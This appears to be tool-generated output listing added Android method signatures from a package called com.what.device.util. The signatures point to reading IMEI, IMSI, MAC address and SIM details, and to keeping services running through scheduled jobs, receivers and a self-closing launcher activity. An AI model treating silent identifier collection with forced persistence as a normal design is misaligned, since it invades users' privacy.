+Lcom/what/device/util/c$1;-><init>(Lcom/what/device/util/c;)V [access_flags=constructor] @ 0xe474
+Lcom/what/device/util/c$1;->run()V [access_flags=public final] @ 0xe490
+Lcom/what/device/util/c;->a()V [access_flags=final] @ 0xe64c
+Ljava/util/concurrent/atomic/AtomicInteger;->set(I)V
+Landroid/content/Context;->bindService(Landroid/content/Intent; Landroid/content/ServiceConnection; I)Z
+Lcom/what/device/util/c;-><init>(Landroid/content/Context;)V [access_flags=private constructor] @ 0xe53c
+Lcom/what/device/util/c;->b()V [access_flags=private] @ 0xe5e0
+Landroid/os/SystemClock;->uptimeMillis()J
+Landroid/content/SharedPreferences$Editor;->apply()V
+Ljava/util/concurrent/atomic/AtomicInteger;-><init>(I)V
+Landroid/content/Context;->getMainLooper()Landroid/os/Looper;
+Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable; J)Z
+Ljava/util/concurrent/atomic/AtomicInteger;->get()I
+Lcom/what/device/util/c;->onServiceConnected(Landroid/content/ComponentName; Landroid/os/IBinder;)V [access_flags=public final] @ 0xe690
+Landroid/content/ComponentName;->getClassName()Ljava/lang/String;
+Lcom/what/device/util/c;->onServiceDisconnected(Landroid/content/ComponentName;)V [access_flags=public final] @ 0xe6f4
+Landroid/content/Context;->unbindService(Landroid/content/ServiceConnection;)V
+Lcom/what/device/util/d;->a(Landroid/content/Context;)Ljava/lang/String; [access_flags=public static] @ 0xe77c
+Landroid/content/Context;->getString(I)Ljava/lang/String;
+Lcom/what/device/util/d;->b(Landroid/content/Context;)Ljava/lang/String; [access_flags=public static] @ 0xe808
+Lcom/what/device/util/d;->c(Landroid/content/Context;)Ljava/lang/String; [access_flags=public static] @ 0xe858
+Ljava/lang/String;->valueOf(I)Ljava/lang/String;
+Lcom/what/device/util/e;->a(Landroid/content/Context;)Ljava/lang/String; [access_flags=public static] @ 0xe8c4
+Landroid/content/SharedPreferences;->getString(Ljava/lang/String; Ljava/lang/String;)Ljava/lang/String;
+Lcom/what/device/util/e;->a(Landroid/content/Context; Ljava/lang/String;)V [access_flags=public static] @ 0xe90c
+Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String; Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;
+Landroid/content/Intent;->getBooleanExtra(Ljava/lang/String; Z)Z
+Ljava/io/BufferedWriter;->flush()V
+Ljava/io/FileWriter;-><init>(Ljava/io/File;)V
+Ljava/io/BufferedWriter;-><init>(Ljava/io/Writer;)V
+Ljava/io/BufferedWriter;->append(Ljava/lang/CharSequence;)Ljava/io/Writer;
+Landroid/telephony/TelephonyManager;->getSimState()I
+Landroid/net/NetworkInfo;->getSubtype()I
+Landroid/net/NetworkInfo;->getSubtypeName()Ljava/lang/String;
+Landroid/net/NetworkInfo;->isConnected()Z
+Lcom/what/device/util/h;->a()Ljava/lang/String; [access_flags=public static] @ 0xeaf8
+Ljava/net/NetworkInterface;->getName()Ljava/lang/String;
+Ljava/lang/String;->format(Ljava/lang/String; [Ljava/lang/Object;)Ljava/lang/String;
+Ljava/net/NetworkInterface;->getHardwareAddress()[B
+Ljava/util/Collections;->list(Ljava/util/Enumeration;)Ljava/util/ArrayList;
+Ljava/net/NetworkInterface;->getNetworkInterfaces()Ljava/util/Enumeration;
+Ljava/lang/Byte;->valueOf(B)Ljava/lang/Byte;
+Lcom/what/device/util/h;->a(Landroid/content/Context;)Ljava/lang/String; [access_flags=public static] @ 0xebec
+Landroid/telephony/TelephonyManager;->getDeviceId()Ljava/lang/String;
+Lcom/what/device/util/h;->b(Landroid/content/Context;)Ljava/lang/String; [access_flags=public static] @ 0xec68
+Landroid/telephony/TelephonyManager;->getSubscriberId()Ljava/lang/String;
+Lcom/what/device/util/h;->c(Landroid/content/Context;)Ljava/lang/String; [access_flags=public static] @ 0xecb4
+Lcom/what/device/util/h;->d(Landroid/content/Context;)Ljava/lang/String; [access_flags=public static] @ 0xecf4
+Landroid/telephony/TelephonyManager;->getPhoneType()I
+Landroid/telephony/TelephonyManager;->getNetworkOperator()Ljava/lang/String;
+Landroid/telephony/TelephonyManager;->getSimOperator()Ljava/lang/String;
+Lcom/what/device/util/i;-><init>()V [access_flags=constructor] @ 0xeeb8
+Lcom/what/device/util/j;-><init>(Landroid/content/Context;)V [access_flags=private constructor] @ 0xef68
+Ljava/util/UUID;-><init>(J J)V
+Landroid/content/Context;->getResources()Landroid/content/res/Resources;
+Ljava/lang/String;->hashCode()I
+Landroid/content/res/Resources;->getDisplayMetrics()Landroid/util/DisplayMetrics;
+Ljava/util/UUID;->toString()Ljava/lang/String;
+Lcom/what/device/util/job/AUSReceiver;-><init>()V [access_flags=public constructor] @ 0xf1cc
+Lcom/what/device/util/job/AUSReceiver;->onReceive(Landroid/content/Context; Landroid/content/Intent;)V [access_flags=public] @ 0xf1e4
+Lcom/what/device/util/job/LauncherActivity;-><init>()V [access_flags=public constructor] @ 0xf290
+Landroid/app/Activity;-><init>()V
+Lcom/what/device/util/job/LauncherActivity;->onCreate(Landroid/os/Bundle;)V [access_flags=protected] @ 0xf2a8
+Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V
+Lcom/what/device/util/job/LauncherActivity;->getWindow()Landroid/view/Window;
+Landroid/view/Window;->setGravity(I)V
+Lcom/what/device/util/job/LauncherActivity;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
+Landroid/view/Window;->getAttributes()Landroid/view/WindowManager$LayoutParams;
+Lcom/what/device/util/job/LauncherActivity;->finish()V
+Landroid/view/Window;->setAttributes(Landroid/view/WindowManager$LayoutParams;)V
+Lcom/what/device/util/job/LauncherActivity;->onDestroy()V [access_flags=protected] @ 0xf308
+Landroid/app/Activity;->onDestroy()V
+Lcom/what/device/util/job/LauncherActivity;->getTaskId()I
+Lcom/what/device/util/job/LauncherActivity;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;
+Lcom/what/device/util/job/StartService;-><init>()V [access_flags=public constructor] @ 0xf398
+Lcom/what/device/util/job/StartService;->onStart(Landroid/content/Intent; I)V [access_flags=public] @ 0xf3c4
+Landroid/app/Service;->onStart(Landroid/content/Intent; I)V
+Lcom/what/device/util/job/StartService;->onStartCommand(Landroid/content/Intent; I I)I [access_flags=public] @ 0xf3dc
+Landroid/app/Service;->onStartCommand(Landroid/content/Intent; I I)I
+Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;
+Lcom/what/device/util/job/StartService;->getApplicationContext()Landroid/content/Context;
+Lcom/what/device/util/job/StartService;->getPackageName()Ljava/lang/String;
+Lcom/what/device/util/job/a;->b(Landroid/content/Context;)V [access_flags=public static] @ 0xf88c
+Lcom/what/device/util/job/WorkJobService;-><init>()V [access_flags=public constructor] @ 0xf4d0
+Landroid/app/job/JobService;-><init>()V
+Lcom/what/device/util/job/WorkJobService;->onStartJob(Landroid/app/job/JobParameters;)Z [access_flags=public] @ 0xf4e8
+Landroid/app/job/JobParameters;->getJobId()I
+Landroid/os/PersistableBundle;->isEmpty()Z
+Landroid/app/job/JobParameters;->getExtras()Landroid/os/PersistableBundle;
+Lcom/what/device/util/job/WorkJobService;->getApplicationContext()Landroid/content/Context;
+Ljava/util/concurrent/atomic/AtomicBoolean;->set(Z)V
+Landroid/os/PersistableBundle;->getInt(Ljava/lang/String; I)I
+Lcom/what/device/util/job/XMPPReceiver;-><init>()V [access_flags=public constructor] @ 0xf5d4
+Lcom/what/device/util/job/XMPPReceiver;->onReceive(Landroid/content/Context; Landroid/content/Intent;)V [access_flags=public] @ 0xf5ec
+Lcom/what/device/util/job/a$a;-><init>(Lcom/what/device/util/job/a; Landroid/content/Context;)V [access_flags=public constructor] @ 0xf65c
+Lcom/what/device/util/job/a$a;->run()V [access_flags=public final] @ 0xf684
+Landroid/app/job/JobScheduler;->schedule(Landroid/app/job/JobInfo;)I
+Landroid/app/job/JobInfo$Builder;->build()Landroid/app/job/JobInfo;
+Landroid/app/job/JobInfo$Builder;->setOverrideDeadline(J)Landroid/app/job/JobInfo$Builder;
+Lcom/what/device/util/job/a;->a(Lcom/what/device/util/job/a;)Ljava/util/concurrent/atomic/AtomicBoolean; [access_flags=static synthetic] @ 0xf840
+Landroid/app/job/JobInfo$Builder;-><init>(I Landroid/content/ComponentName;)V
+Landroid/app/job/JobInfo$Builder;->setMinimumLatency(J)Landroid/app/job/JobInfo$Builder;
+Landroid/os/PersistableBundle;-><init>()V
+Landroid/os/PersistableBundle;->putInt(Ljava/lang/String; I)V
+Landroid/app/job/JobInfo$Builder;->setExtras(Landroid/os/PersistableBundle;)Landroid/app/job/JobInfo$Builder;
+Ljava/util/concurrent/atomic/AtomicBoolean;->get()Z
+Lcom/what/device/util/job/c;->a(Ljava/lang/Runnable;)V [access_flags=public static] @ 0xf9c4
+Landroid/content/Context;->sendBroadcast(Landroid/content/Intent;)V
+Lcom/what/device/util/job/a;-><clinit>()V [access_flags=static constructor] @ 0xf7c8
+Lcom/what/device/util/job/a;-><init>()V [access_flags=public constructor] @ 0xf7f0
+Ljava/util/concurrent/atomic/AtomicBoolean;-><init>(Z)V
+Lcom/what/device/util/job/c;->a()Ljava/util/concurrent/ScheduledExecutorService; [access_flags=private static] @ 0xf974
+Ljava/util/concurrent/ScheduledExecutorService;->execute(Ljava/lang/Runnable;)V
+Lcom/what/device/util/job/c;-><init>()V [access_flags=private constructor] @ 0xf95c
+Ljava/util/concurrent/Executors;->newScheduledThreadPool(I)Ljava/util/concurrent/ScheduledExecutorService;
